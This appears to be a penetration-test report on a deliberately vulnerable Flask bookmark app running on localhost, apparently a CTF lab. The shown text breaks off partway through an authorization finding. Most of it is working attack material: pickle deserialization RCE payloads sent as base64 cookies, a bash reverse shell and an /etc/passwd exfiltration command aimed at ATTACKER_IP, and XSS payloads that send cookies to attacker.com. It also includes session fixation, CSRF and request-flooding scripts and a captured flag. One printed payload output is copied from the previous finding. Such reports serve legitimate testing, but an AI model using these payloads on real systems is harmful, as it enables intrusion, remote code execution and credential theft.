# Security Assessment Report

## Executive Summary

- **Target:** http://localhost:45971
- **Assessment Date:** October 31, 2025
- **Scope:** Authentication, XSS, SQL and Command Injection, SSRF, Authorization testing

### Summary by Vulnerability Type

**Authentication Vulnerabilities:**

Six critical authentication vulnerabilities were successfully exploited. The application transmits all session data over unencrypted HTTP without TLS/HTTPS configuration or HSTS headers, enabling trivial man-in-the-middle attacks. Session cookies lack HttpOnly flags, allowing JavaScript-based theft via XSS attacks. No session timeout mechanism exists, giving stolen sessions indefinite validity. The application accepts arbitrary attacker-supplied UUID values without validation, enabling session fixation attacks. No rate limiting exists on any endpoint, allowing unlimited automated session creation requests (559 requests/second achieved during testing). Finally, no logout functionality exists, preventing victims from terminating compromised sessions. These vulnerabilities combine to enable complete account takeover with no recovery mechanism for victims.

**Authorization Vulnerabilities:**

Three high-severity authorization vulnerabilities were exploited, demonstrating complete horizontal privilege escalation capability. The application stores all user data in client-side cookies with zero server-side ownership validation. An attacker who steals victim cookies (achievable via XSS or network sniffing on HTTP) can view all victim bookmarks (GET /list), inject malicious bookmarks into victim collections (POST /add), and delete victim bookmarks (GET /delete). The root cause is the complete absence of authorization controls—the code pattern `pickle.loads(request.cookies.get('bookmarks'))` appears at three locations with no authorization guards. Server blindly trusts cookie contents and executes operations without ownership verification, enabling complete compromise of user data confidentiality, integrity, and availability.

**Cross-Site Scripting (XSS) Vulnerabilities:**

Two XSS vulnerabilities were successfully exploited. A critical stored XSS vulnerability exists via JavaScript protocol injection in bookmark URLs. The application accepts arbitrary URL schemes without validation, and when users submit `javascript:` protocol URLs, JavaScript executes in the application's origin when clicked. This enables complete session hijacking—cookies were successfully extracted containing user identifiers and serialized bookmark data. No Content Security Policy is configured, session cookies lack HttpOnly flags, and CORS policy is wildcard (*), creating a complete attack chain for cookie exfiltration. A second vulnerability involves URL parameter pollution where HTML entity encoding is used instead of URL percent-encoding, allowing injection of additional URL parameters that manipulate application logic.

**SQL/Command Injection Vulnerabilities:**

Three critical insecure deserialization vulnerabilities were successfully exploited, enabling Remote Code Execution (RCE). The application deserializes user-controlled cookie data using Python's `pickle.loads()` without any validation at three endpoints: GET /list (routes.py:37), POST /add (routes.py:59), and GET /delete (routes.py:80). By crafting malicious pickle payloads with `__reduce__` methods, arbitrary commands execute with web server privileges. The CTF FLAG was successfully extracted: `FLAG{d46e088f991888c0f307f4889b22ef71a50421ce413738c010a43963cbb81f0a}`. No authentication, input validation, signature verification, or integrity checking protects these endpoints. Exploitation is trivial—Base64-encoded malicious pickle payloads sent as cookies achieve immediate code execution. No SQL injection vulnerabilities exist as the application has no database.

**Server-Side Request Forgery (SSRF) Vulnerabilities:**

No SSRF vulnerabilities were found. The application architecture fundamentally lacks server-side external request capability. No HTTP client libraries are installed (no requests, urllib, httpx), no HTTP requests are made in application code, and user-submitted URLs are used only for client-side navigation via HTML anchor tags with `target="_blank"`. The Flask server never fetches or follows URLs. All redirect operations use Flask's `url_for()` function for internal URLs only. This is a pure CRUD application with client-side cookie storage where all URL handling occurs in the browser, not on the server, making SSRF attacks architecturally impossible.

## Network Reconnaissance

**Open Ports and Services:**
- Port 80/tcp: Caddy httpd proxy → Apache 2.4.65 (Debian) → Flask 3.1.1 application
- Port 443/tcp: SSL/HTTPS (exposed but not configured for this application)
- Port 631/tcp: CUPS 2.3 printing service with exposed /robots.txt
- Port 8888/tcp: SimpleHTTPServer exposing .git repository (Git repository found at 127.0.0.1:8888/.git/)
- Port 9999/tcp: tcpwrapped service (identity obscured)
- Port 49152/tcp: Golang net/http server (Tailscale) requiring authentication

**Security Misconfigurations:**
- **No HTTPS/TLS:** Target application runs HTTP-only on port 80 with no encryption
- **Exposed Git Repository:** Port 8888 exposes .git directory containing full repository history and commit messages
- **CORS Wildcard Policy:** Apache configured with `Access-Control-Allow-Origin: *` allowing any origin to make authenticated requests
- **Directory Indexing Enabled:** `Options Indexes` set on /static/ directory, exposing file listings
- **Missing Security Headers:** No HSTS, CSP, X-Frame-Options, X-Content-Type-Options, or Strict-Transport-Security headers
- **Information Disclosure:** `Powered-By: Flask` header reveals framework version

**Subdomain Discoveries:**
Multiple subdomains discovered via subfinder that could expand attack surface:
- server2.hunter.localhost, www.localhost, naeu2.naeuinc.localhost
- mail.localhost, autodiscover.regency.localhost, mail02.regency.localhost
- tools.sonoma.edu.localhost, server02.counterintel.localhost
- mse-ca-mail.corp.mse.localhost, mail03.regency.localhost
- exchvm.nwcnet.localhost, fndlync01.5ninesdata.localhost
- autodiscover.localhost, mail.regency.localhost, owa.regency.localhost
- sbs.allsaintsschool.localhost

**Technology Stack Exposure:**
- Apache 2.4.65 on Debian Linux (identified via HTTP headers)
- Bootstrap 5.x and jQuery 3.6.0 served without Subresource Integrity (SRI) hashes
- Flask application with hardcoded weak secret key (`'your_secret_key_'`)
- No WAF, rate limiting, or security middleware detected

# Injection Exploitation Evidence

## Successfully Exploited Vulnerabilities

### INJ-VULN-01: Insecure Pickle Deserialization in GET /list Endpoint

**Summary:**
- **Vulnerable location:** GET /list endpoint (routes.py:35-37)
- **Overview:** User-controlled cookie data is deserialized using Python's pickle.loads() without any validation, enabling Remote Code Execution (RCE) with web server privileges
- **Impact:** Complete system compromise - arbitrary command execution, FLAG extraction, potential reverse shell access
- **Severity:** CRITICAL (CVSS 9.8)

**Prerequisites:**
- Network access to http://localhost:45971/list
- Ability to set HTTP cookies

**Exploitation Steps:**

1. **Craft malicious pickle payload to extract FLAG:**
```python
import pickle
import base64

class FlagExtract:
    def __reduce__(self):
        import os
        # Write FLAG environment variable to accessible location
        cmd = 'printenv FLAG > /var/www/bookmarks/app/static/js/flag.txt'
        return (os.system, (cmd,))

malicious = pickle.dumps(FlagExtract())
cookie_value = base64.b64encode(malicious).decode('ISO-8859-1')
print(cookie_value)
# Output: gASVVAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDlwcmludGVudiBGTEFHID4gL3Zhci93d3cvYm9va21hcmtzL2FwcC9zdGF0aWMvanMvZmxhZy50eHSUhZRSlC4=
```

2. **Send malicious cookie to /list endpoint:**
```bash
curl -s -H "Cookie: bookmarks=gASVVAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjDlwcmludGVudiBGTEFHID4gL3Zhci93d3cvYm9va21hcmtzL2FwcC9zdGF0aWMvanMvZmxhZy50eHSUhZRSlC4=; user=test" http://localhost:45971/list
```

3. **Retrieve extracted FLAG:**
```bash
curl -s http://localhost:45971/static/js/flag.txt
```

**Proof of Impact:**
```
FLAG{d46e088f991888c0f307f4889b22ef71a50421ce413738c010a43963cbb81f0a}
```

**Technical Details:**
- **Source:** Cookie 'bookmarks' (user-controlled)
- **Sink:** pickle.loads() at routes.py:37
- **Data Flow:** Cookie value → base64.b64decode() → pickle.loads() → RCE
- **No Sanitization:** Base64 decode is encoding transformation, not security control
- **Execution Context:** www-data user in Docker container
- **Flag Location:** os.environ["FLAG"] environment variable set at __init__.py:8

**Alternative RCE Payloads:**

*Reverse Shell:*
```python
class ReverseShell:
    def __reduce__(self):
        import os
        return (os.system, ('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"',))
```

*File Exfiltration:*
```python
class Exfil:
    def __reduce__(self):
        import os
        return (os.system, ('tar czf - /etc/passwd | base64 | curl -X POST -d @- http://ATTACKER_IP/exfil',))
```

**Notes:**
- Exploitation is trivial - no authentication required
- Works on first visit without any prior interaction
- No WAF or input validation present
- Directory listing enabled on /static/ allowing verification of file creation

---

### INJ-VULN-02: Insecure Pickle Deserialization in POST /add Endpoint

**Summary:**
- **Vulnerable location:** POST /add endpoint (routes.py:58-59)
- **Overview:** Identical vulnerability pattern to INJ-VULN-01. The POST /add endpoint deserializes the bookmarks cookie before adding a new bookmark, enabling RCE
- **Impact:** Complete system compromise via second entry point
- **Severity:** CRITICAL (CVSS 9.8)

**Prerequisites:**
- Network access to http://localhost:45971/add
- Ability to set HTTP cookies
- Must provide form data (name and url parameters) - values don't matter for exploitation

**Exploitation Steps:**

1. **Craft malicious pickle payload:**
```python
import pickle
import base64

class Vuln02Exploit:
    def __reduce__(self):
        import os
        # Create proof of exploitation marker
        cmd = 'echo "INJ-VULN-02-EXPLOITED" > /var/www/bookmarks/app/static/js/vuln02.txt'
        return (os.system, (cmd,))

malicious = pickle.dumps(Vuln02Exploit())
cookie_value = base64.b64encode(malicious).decode('ISO-8859-1')
print(cookie_value)
# Output: gASVZQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEplY2hvICJJTkotVlVMTi0wMi1FWFBMT0lURUQiID4gL3Zhci93d3cvYm9va21hcmtzL2FwcC9zdGF0aWMvanMvdnVsbjAyLnR4dJSFlFKULg==
```

2. **Send malicious cookie with POST request:**
```bash
curl -s -X POST \
  -H "Cookie: bookmarks=gASVZQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEplY2hvICJJTkotVlVMTi0wMi1FWFBMT0lURUQiID4gL3Zhci93d3cvYm9va21hcmtzL2FwcC9zdGF0aWMvanMvdnVsbjAyLnR4dJSFlFKULg==; user=test" \
  -d "name=TestBookmark&url=http://example.com" \
  http://localhost:45971/add
```

3. **Verify exploitation:**
```bash
curl -s http://localhost:45971/static/js/vuln02.txt
```

**Proof of Impact:**
```
INJ-VULN-02-EXPLOITED
```

**Technical Details:**
- **Source:** Cookie 'bookmarks' at routes.py:58
- **Sink:** pickle.loads() at routes.py:59
- **Data Flow:** Cookie → base64.b64decode() → pickle.loads() → RCE
- **Trigger:** Requires POST with form data, but form values irrelevant to exploitation
- **Same FLAG Extraction:** Can use identical FLAG extraction payload from INJ-VULN-01

**Notes:**
- Second independent RCE entry point
- Requires form submission but no CSRF protection
- No authentication or authorization checks
- Cookie deserialization happens BEFORE form processing, so malicious cookie executes regardless of form data validity

---

### INJ-VULN-03: Insecure Pickle Deserialization in GET /delete Endpoint

**Summary:**
- **Vulnerable location:** GET /delete endpoint (routes.py:78-80)
- **Overview:** Third instance of the same vulnerable pattern. The DELETE operation deserializes the bookmarks cookie, enabling RCE
- **Impact:** Complete system compromise via third entry point
- **Severity:** CRITICAL (CVSS 9.8)

**Prerequisites:**
- Network access to http://localhost:45971/delete
- Ability to set HTTP cookies
- Must provide 'name' query parameter - value doesn't matter for exploitation

**Exploitation Steps:**

1. **Craft malicious pickle payload:**
```python
import pickle
import base64

class Vuln03Exploit:
    def __reduce__(self):
        import os
        # Create proof of exploitation marker
        cmd = 'echo "INJ-VULN-03-EXPLOITED" > /var/www/bookmarks/app/static/js/vuln03.txt'
        return (os.system, (cmd,))

malicious = pickle.dumps(Vuln03Exploit())
cookie_value = base64.b64encode(malicious).decode('ISO-8859-1')
print(cookie_value)
# Output: gASVZQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEplY2hvICJJTkotVlVMTi0wMi1FWFBMT0lURUQiID4gL3Zhci93d3cvYm9va21hcmtzL2FwcC9zdGF0aWMvanMvdnVsbjAyLnR4dJSFlFKULg==
```

2. **Send malicious cookie to /delete endpoint:**
```bash
curl -s \
  -H "Cookie: bookmarks=gASVZQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEplY2hvICJJTkotVlVMTi0wMy1FWFBMT0lURUQiID4gL3Zhci93d3cvYm9va21hcmtzL2FwcC9zdGF0aWMvanMvdnVsbjAzLnR4dJSFlFKULg==; user=test" \
  "http://localhost:45971/delete?name=test"
```

3. **Verify exploitation:**
```bash
curl -s http://localhost:45971/static/js/vuln03.txt
```

**Proof of Impact:**
```
INJ-VULN-03-EXPLOITED
```

**Technical Details:**
- **Source:** Cookie 'bookmarks' at routes.py:78
- **Sink:** pickle.loads() at routes.py:80
- **Data Flow:** Cookie → base64.b64decode() → pickle.loads() → RCE
- **Trigger:** Requires 'name' query parameter (any value works)
- **HTTP Method Issue:** Uses GET for state-changing operation (HTTP semantics violation)
- **CSRF Vulnerable:** Can be triggered via image tag or link

**CSRF Attack Vector:**
```html
<!-- Attacker's webpage can trigger RCE when victim visits -->
<img src="http://localhost:45971/delete?name=anything" style="display:none">
<!-- If victim has malicious cookie set via XSS or other means -->
```

**Notes:**
- Third independent RCE entry point
- Most dangerous due to GET method - trivial CSRF exploitation
- Can be chained with XSS to set malicious cookie then trigger via CSRF
- No rate limiting allows automated exploitation

# Cross-Site Scripting (XSS) Exploitation Evidence

## Successfully Exploited Vulnerabilities

### XSS-VULN-01: Stored XSS via JavaScript Protocol in href Attribute

**Summary:**
- **Vulnerable location:** POST http://localhost:45971/add (url parameter) → Rendered at http://localhost:45971/list
- **Overview:** The application accepts arbitrary URL schemes without validation. By injecting a javascript: protocol URL, JavaScript executes in the application's origin when a user clicks the malicious bookmark link, enabling complete session hijacking.
- **Impact:** Complete session compromise - attackers can steal session cookies, perform unauthorized actions, and fully impersonate the victim user
- **Severity:** CRITICAL

**Prerequisites:**
- Access to the bookmark creation form at http://localhost:45971/add (no authentication required)
- Target user must click the malicious bookmark link

**Exploitation Steps:**

1. Navigate to the bookmark creation page:
```
GET http://localhost:45971/add
```

2. Submit a bookmark with a malicious javascript: protocol URL:
```
POST http://localhost:45971/add
Content-Type: application/x-www-form-urlencoded

name=XSS-Session-Hijack&url=javascript:void(document.body.innerHTML='<h1>XSS SUCCESSFUL</h1><h2>Stolen Session Cookies:</h2><pre>'+document.cookie+'</pre>')
```

3. The malicious bookmark is stored and rendered on the list page:
```
GET http://localhost:45971/list
```

The rendered HTML contains:
```html
<a class="text-decoration-none" href="javascript:void(document.body.innerHTML='<h1>XSS SUCCESSFUL</h1><h2>Stolen Session Cookies:</h2><pre>'+document.cookie+'</pre>')" target="_blank">
```

4. When a victim clicks the malicious bookmark link, JavaScript executes in the application's origin context

5. The JavaScript payload replaces the page content and displays the stolen session cookies

**Proof of Impact:**

Successfully extracted session cookies:
```
user=2446bfff74e447909abd83f11c31c7bf
bookmarks=gASVyQAAAAAAAABdlIwKYXBwLm1vZGVsc5SMBlVybE9iapSTlCmBlH2UKIwEbmFtZZSMElhTUy1TZXNzaW9uLUhpamFja5SMA3VybJSMgGphdmFzY3JpcHQ6dm9pZChkb2N1bWVudC5ib2R5LmlubmVySFRNTD0nPGgxPlhTUyBTVUNDRVNTRlVMPC9oMT48aDI+U3RvbGVuIFNlc3Npb24gQ29va2llczo8L2gyPjxwcmU+Jytkb2N1bWVudC5jb29raWUrJzwvcHJlPicplHViYS4=
```

Visual proof:
- Evidence screenshot: workspace/xss-vuln-01-proof.png
- Page successfully hijacked showing "XSS SUCCESSFUL" and full cookie disclosure

**Attack Scenario - Complete Session Hijacking:**

An attacker can weaponize this vulnerability to exfiltrate cookies to an external server:

```
POST http://localhost:45971/add
Content-Type: application/x-www-form-urlencoded

name=Legitimate-Looking-Link&url=javascript:fetch('http://attacker.com/steal?c='+encodeURIComponent(document.cookie))
```

When the victim clicks the link:
1. JavaScript executes in the application's origin (localhost:45971)
2. The fetch() API sends cookies to attacker-controlled server
3. Attacker receives: `user` cookie (session UUID) and `bookmarks` cookie (serialized data)
4. Attacker can replay these cookies to fully impersonate the victim

**Notes:**
- No Content Security Policy (CSP) is configured, allowing inline JavaScript execution
- Session cookies lack HttpOnly flag, making them accessible via document.cookie
- CORS policy is wildcard (*), allowing exfiltration to any domain
- No authentication required to inject malicious bookmarks
- Persistent storage (cookies) means the malicious bookmark survives browser sessions

---

### XSS-VULN-03: URL Parameter Pollution via Inadequate Context Encoding

**Summary:**
- **Vulnerable location:** POST http://localhost:45971/add (name parameter) → Rendered in delete link at http://localhost:45971/list
- **Current Blocker:** None - Successfully exploited
- **Potential Impact:** Parameter tampering enabling logic manipulation attacks
- **Confidence:** HIGH

**Why We Believe This Is Vulnerable:**
The application uses HTML entity encoding (converting `&` to `&amp;`) where URL percent-encoding is required. When browsers parse href attributes as URLs, they decode `&amp;` back to `&`, allowing injection of additional URL parameters.

Code evidence from reconnaissance:
```python
# routes.py line 56 - User input without URL encoding
name = request.form.get('name')

# list_urls.html line 42 - Rendered in URL parameter context
<a href="delete?name={{ item.name }}">delete</a>
```

Jinja2 applies HTML escaping, but browsers decode HTML entities in href attributes before processing as URLs.

**How This Was Exploited:**

1. Navigate to bookmark creation:
```
GET http://localhost:45971/add
```

2. Submit a bookmark with URL parameter injection in the name field:
```
POST http://localhost:45971/add
Content-Type: application/x-www-form-urlencoded

name=test&admin=true&debug=1&url=http://example.com
```

3. The malicious name is stored and rendered on the list page:
```
GET http://localhost:45971/list
```

4. Inspect the rendered HTML of the delete link:
```html
<a href="delete?name=test&amp;admin=true&amp;debug=1">delete</a>
```

HTML source shows `&amp;` (HTML-encoded), but browser's href property decodes it to:
```
http://localhost:45971/delete?name=test&admin=true&debug=1
```

5. When the delete link is clicked, the browser sends three separate parameters to the server:
```
GET /delete?name=test&admin=true&debug=1
```

**Proof of Impact:**

Network request captured from browser:
```
[GET] http://localhost:45971/delete?name=test&admin=true&debug=1 => [302] FOUND
```

The server received THREE distinct parameters:
- `name=test` (intended parameter)
- `admin=true` (injected parameter)
- `debug=1` (injected parameter)

JavaScript evaluation confirmed the encoding mismatch:
```javascript
{
  "innerHTML": "<a href=\"delete?name=test&amp;admin=true&amp;debug=1\">delete</a>",
  "hrefProperty": "http://localhost:45971/delete?name=test&admin=true&debug=1",
  "getAttribute": "delete?name=test&amp;admin=true&amp;debug=1"
}
```

**Expected Impact:**

This vulnerability enables parameter tampering attacks where attackers can:
- Inject privileged parameters (admin=true, role=admin, debug=1)
- Bypass access controls if the application trusts query parameters
- Manipulate application logic by adding unexpected parameters
- Pollute logs with injected parameters
- Conduct reconnaissance by testing for hidden parameters

Evidence screenshot: workspace/xss-vuln-03-param-pollution.png

**Notes:**
The bookmark was not deleted because the stored name is "test&admin=true&debug=1" but the server received `name=test`. This demonstrates the parameter pollution - the application logic is confused by the injected parameters.

Proper fix requires URL encoding: `{{ item.name|urlencode }}` or using Flask's `url_for('delete', name=item.name)`


# Authentication Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTH-VULN-01: Session Hijacking via HTTP Transport (MITM Attack)

**Summary:**
- **Vulnerable location:** All endpoints - HTTP-only transport (port 80)
- **Overview:** Application transmits session cookies in plaintext over HTTP without TLS encryption or HSTS headers, enabling trivial session hijacking via man-in-the-middle (MITM) attacks
- **Impact:** Complete account takeover - attacker can intercept session cookies and impersonate any user
- **Severity:** Critical

**Prerequisites:**
- Attacker positioned on network path (public WiFi, compromised router, ISP-level access)
- Victim accessing application over HTTP at http://localhost:45971

**Exploitation Steps:**

1. **Victim creates session and adds sensitive bookmark:**
```bash
curl -s -c /tmp/victim_session.txt http://localhost:45971/list > /dev/null
curl -s -b /tmp/victim_session.txt -c /tmp/victim_session.txt \
  -X POST -d "name=SecretFlag&url=https://secret-company-data.com/flag" \
  http://localhost:45971/add > /dev/null
```

2. **Attacker intercepts HTTP traffic (MITM) and captures cookies:**
```bash
# Cookies transmitted in plaintext:
cat /tmp/victim_session.txt
# Output shows:
# localhost  FALSE  /  FALSE  0  user  53688fc7dea54b17a62705d3c120e417
# localhost  FALSE  /  FALSE  0  bookmarks  gASVZQAAAAAAAABdlIw...
```

3. **Attacker replays stolen cookies to hijack session:**
```bash
curl -s -b /tmp/victim_session.txt http://localhost:45971/list | grep "SecretFlag"
```

4. **Attacker can now modify victim's data:**
```bash
curl -s -b /tmp/victim_session.txt -c /tmp/victim_session.txt \
  -X POST -d "name=Backdoor&url=https://attacker.com/exfiltrate" \
  http://localhost:45971/add
```

**Proof of Impact:**
Successfully accessed victim's private bookmarks including "SecretFlag" pointing to `https://secret-company-data.com/flag` and injected malicious "Backdoor" bookmark. Complete session takeover achieved through cookie replay.

**Notes:**
- No TLS/HTTPS configuration exists (Apache VirtualHost *:80 only)
- No HSTS headers to enforce HTTPS
- No Secure flag on cookies (see AUTH-VULN-02)
- Attack works on any network where traffic can be intercepted (WiFi, LAN, WAN)

---

### AUTH-VULN-02: Session Cookie Theft via Missing HttpOnly Flag

**Summary:**
- **Vulnerable location:** All cookie-setting endpoints (/list, /add, /delete)
- **Overview:** Session cookies (`user` and `bookmarks`) lack HttpOnly flag, allowing JavaScript to access and exfiltrate cookies via XSS attacks
- **Impact:** Session hijacking via XSS - stolen cookies enable complete account takeover
- **Severity:** High

**Prerequisites:**
- Existing XSS vulnerability in application (documented by XSS specialist)
- OR attacker-controlled JavaScript in victim's browser context

**Exploitation Steps:**

1. **Victim creates session with sensitive data:**
```bash
# Access application and create bookmark
curl -s http://localhost:45971/list
curl -s -X POST -d "name=SensitiveData&url=https://company-secrets.com/api" \
  http://localhost:45971/add
```

2. **Attacker injects JavaScript payload (via existing XSS) to steal cookies:**
```javascript
// Execute in victim's browser console or via XSS payload:
const cookies = document.cookie;
console.log("Stolen cookies:", cookies);
// Output: "user=91532604108148d7bb3d11157fe8f358; bookmarks=gASVYwAAAAAAAABdlIwK..."

// In real attack, exfiltrate to attacker server:
fetch('https://attacker.com/steal?c=' + encodeURIComponent(document.cookie))
```

3. **Attacker uses stolen cookies to hijack session:**
```bash
# Set stolen cookies in attacker's request:
curl -s -b "user=91532604108148d7bb3d11157fe8f358; bookmarks=gASVYwAAAAAAAABdlIwK..." \
  http://localhost:45971/list
```

**Proof of Impact:**
JavaScript successfully accessed session cookies containing user identifier and serialized bookmark data. Demonstrated in browser that `document.cookie` returns full session state:
```
"user=91532604108148d7bb3d11157fe8f358; bookmarks=gASVYwAAAAAAAABdlIwKYXBwLm1vZGVsc5SMBlVybE9iapSTlCmBlH2UKIwEbmFtZZSMDVNlbnNpdGl2ZURhdGGUjAN1cmyUjB9odHRwczovL2NvbXBhbnktc2VjcmV0cy5jb20vYXBplHViYS4="
```

**Notes:**
- All `set_cookie()` calls lack `httponly=True` parameter (routes.py lines 43-44, 66-67, 84-85)
- Combined with stored XSS vulnerability (javascript: protocol URLs), creates complete attack chain
- Also missing: Secure flag (HTTP transmission), SameSite flag (CSRF protection)

---

### AUTH-VULN-03: Indefinite Session Validity (No Timeout)

**Summary:**
- **Vulnerable location:** Session management architecture - no timeout mechanism
- **Overview:** Session cookies have no expiration (max_age/expires) and no server-side timeout enforcement, allowing stolen sessions to be valid indefinitely
- **Impact:** Unlimited exploitation window - stolen sessions never expire
- **Severity:** Medium

**Prerequisites:**
- Stolen session cookies (via AUTH-VULN-01 or AUTH-VULN-02)

**Exploitation Steps:**

1. **Create victim session and capture cookies:**
```bash
curl -s -c /tmp/session_timeout_test.txt http://localhost:45971/list > /dev/null
curl -s -b /tmp/session_timeout_test.txt -c /tmp/session_timeout_test.txt \
  -X POST -d "name=OldSession&url=https://old-data.com" \
  http://localhost:45971/add > /dev/null
echo "Session created at: $(date)"
```

2. **Wait 30+ seconds (simulate time passing after session theft):**
```bash
sleep 30
```

3. **Verify stolen session remains valid without timeout:**
```bash
curl -s -b /tmp/session_timeout_test.txt http://localhost:45971/list | grep "OldSession"
# Output: OldSession (appears twice in HTML)
```

**Proof of Impact:**
Session remained fully functional after 30 seconds with no timeout or expiration. In production scenarios, stolen sessions from AUTH-VULN-01 (MITM) or AUTH-VULN-02 (XSS) would remain valid indefinitely, giving attackers unlimited time to exploit compromised accounts.

**Notes:**
- No `max_age` or `expires` parameters on any `set_cookie()` calls
- No Flask `PERMANENT_SESSION_LIFETIME` configuration
- No server-side session timeout logic
- Sessions persist until browser closure (no automatic expiration)

---

### AUTH-VULN-04: Session Fixation Attack

**Summary:**
- **Vulnerable location:** Session creation logic (/list endpoint, routes.py:38-44)
- **Overview:** Application accepts arbitrary attacker-supplied UUID values without validation, enabling session fixation attacks where attacker forces victim to use known session identifier
- **Impact:** Account takeover - attacker can monitor all victim activity using pre-set session ID
- **Severity:** Medium

**Prerequisites:**
- Ability to set victim's cookies (via XSS, social engineering, or malicious link)

**Exploitation Steps:**

1. **Attacker generates known UUID:**
```bash
ATTACKER_UUID="FIXEDUUID999"
echo "Attacker controls UUID: $ATTACKER_UUID"
```

2. **Attacker forces victim to use this UUID (simulating XSS cookie injection):**
```javascript
// Via XSS payload or social engineering:
document.cookie = "user=FIXEDUUID999; path=/";
document.cookie = "bookmarks=gARdlC4=; path=/";
```

3. **Victim uses fixed session and adds sensitive data:**
```bash
curl -s -b "user=FIXEDUUID999; bookmarks=gARdlC4=" -c /tmp/victim_fixed.txt \
  -X POST -d "name=Password&url=https://secrets.com/pwd" \
  http://localhost:45971/add > /dev/null
```

4. **Attacker accesses victim's data using the known fixed UUID:**
```bash
curl -s -b /tmp/victim_fixed.txt http://localhost:45971/list | grep "Password"
# Output shows victim's "Password" bookmark visible to attacker
```

**Proof of Impact:**
Successfully forced victim to use attacker-controlled UUID "FIXEDUUID999". Victim added bookmark "Password" with URL `https://secrets.com/pwd`. Attacker then accessed this sensitive data using the same fixed UUID, demonstrating complete session fixation vulnerability.

**Notes:**
- No server-side validation that UUID was legitimately issued (routes.py:38,62,79)
- Despite UUID4 providing 128-bit entropy, stateless architecture allows fixation
- Combined with AUTH-VULN-02 (no HttpOnly), XSS can set cookies to execute fixation

---

### AUTH-VULN-05: Brute Force Session Creation (No Rate Limiting)

**Summary:**
- **Vulnerable location:** All endpoints - no rate limiting implemented
- **Overview:** Application has no rate limiting on session creation or any endpoint, allowing unlimited automated requests for brute force attacks and resource exhaustion
- **Impact:** Denial of Service (DoS), session flooding, resource exhaustion
- **Severity:** Medium

**Prerequisites:**
- Network access to http://localhost:45971

**Exploitation Steps:**

1. **Execute automated brute force attack with 100 rapid session creation requests:**
```python
import requests
import time

target = "http://localhost:45971/list"
start_time = time.time()
results = {"success": 0, "failed": 0}

for i in range(100):
    response = requests.get(target)
    if response.status_code == 200:
        results["success"] += 1
    else:
        results["failed"] += 1

elapsed = time.time() - start_time
print(f"Successful: {results['success']}")
print(f"Failed: {results['failed']}")
print(f"Time: {elapsed:.2f}s")
print(f"Rate: {results['success']/elapsed:.2f} req/s")
```

2. **Observe results:**
```
Successful: 100
Failed: 0
Time: 0.18s
Rate: 559.24 req/s
```

**Proof of Impact:**
Successfully executed 100 consecutive session creation requests in 0.18 seconds (559 requests/second) with zero failures or rate limiting. All requests returned 200 OK, demonstrating:
- No IP-based rate limiting
- No session creation throttling
- No CAPTCHA protection
- No monitoring or alerting for attack patterns

This enables:
- Unlimited session flooding attacks
- Resource exhaustion (memory, CPU, storage)
- Denial of Service (DoS)
- Brute force attacks without detection

**Notes:**
- No Flask-Limiter or rate limiting middleware installed
- No Apache rate limiting modules configured (mod_ratelimit, mod_evasive)
- No per-IP throttling
- No monitoring for suspicious activity patterns

---

### AUTH-VULN-06: Session Persistence After Compromise (No Logout)

**Summary:**
- **Vulnerable location:** Application-wide - no logout endpoint exists
- **Overview:** No logout mechanism or session invalidation functionality exists, preventing users from terminating compromised sessions
- **Impact:** Stolen sessions cannot be revoked - attackers retain permanent access
- **Severity:** Medium

**Prerequisites:**
- Compromised session (via any of AUTH-VULN-01 through AUTH-VULN-04)

**Exploitation Steps:**

1. **Verify no /logout endpoint exists:**
```bash
curl -s -o /dev/null -w "HTTP Status: %{http_code}" http://localhost:45971/logout
# Output: HTTP Status: 404
```

2. **Simulate session compromise:**
```bash
curl -s -c /tmp/compromised.txt http://localhost:45971/list > /dev/null
curl -s -b /tmp/compromised.txt -c /tmp/compromised.txt \
  -X POST -d "name=Compromised&url=https://hacked.com" \
  http://localhost:45971/add > /dev/null
echo "Session compromised - attacker has stolen cookies"
```

3. **Victim realizes compromise and searches for logout:**
```bash
curl -s http://localhost:45971/about | grep -i "logout"
# Output: (no matches - no logout functionality exists)
```

4. **Attacker continues using stolen session indefinitely:**
```bash
curl -s -b /tmp/compromised.txt http://localhost:45971/list | grep "Compromised"
# Output: Compromised (session still active)
```

**Proof of Impact:**
- `/logout` endpoint returns 404 (does not exist)
- No logout links in any application pages
- No `clear_cookie()` calls in codebase
- Victim cannot terminate compromised session
- Attacker retains access indefinitely until victim manually clears browser cookies

Combined with AUTH-VULN-03 (no timeout), stolen sessions remain valid forever with no recovery mechanism for victims.

**Notes:**
- No logout route defined in routes.py (only /, /list, /add, /delete, /about)
- No session invalidation logic exists
- Stateless architecture makes server-side revocation impossible
- Users have zero ability to protect themselves after compromise


# Authorization Exploitation Evidence

## Successfully Exploited Vulnerabilities

### AUTHZ-VULN-01: Horizontal Authorization Bypass on GET /list

**Summary:**
- **Vulnerable location:** GET /list endpoint (routes.py:37)
- **Overview:** Attacker can view other users' private bookmarks by stealing and replaying their `bookmarks` cookie
- **Impact:** Complete unauthorized access to victim's bookmark collection, exposing potentially sensitive URLs and private information
- **Severity:** HIGH

**Prerequisites:**
- Victim must have created bookmarks
- Attacker must obtain victim's `bookmarks` cookie (achievable via XSS, network sniffing on HTTP, or social engineering)

**Exploitation Steps:**

1. **Create victim session with private bookmarks:**
```bash
# Initialize victim session
curl -s -c /tmp/victim_cookies.txt http://localhost:45971/list

# Victim adds private bookmark
curl -b /tmp/victim_cookies.txt -c /tmp/victim_cookies.txt \
  -X POST \
  -d "name=SecretProject&url=http://internal-company-docs.com/secret" \
  http://localhost:45971/add
```

2. **Extract victim's cookies (simulating cookie theft via XSS or network sniffing):**
```bash
# View victim's cookies
cat /tmp/victim_cookies.txt | grep -v "^#"

# Example stolen cookies:
# bookmarks=gASVawAAAAAAAABdlIwKYXBwLm1vZGVsc5SMBlVybE9iapSTlCmBlH2UKIwEbmFtZZSMDVNlY3JldFByb2plY3SUjAN1cmyUjCdodHRwOi8vaW50ZXJuYWwtY29tcGFueS1kb2NzLmNvbS9zZWNyZXSUdWJhLg==
# user=7148219806674ff2baa2a402c9286eed
```

3. **Attacker creates separate session:**
```bash
# Attacker gets their own session
curl -v http://localhost:45971/list 2>&1 | grep "Set-Cookie"

# Attacker receives different cookies:
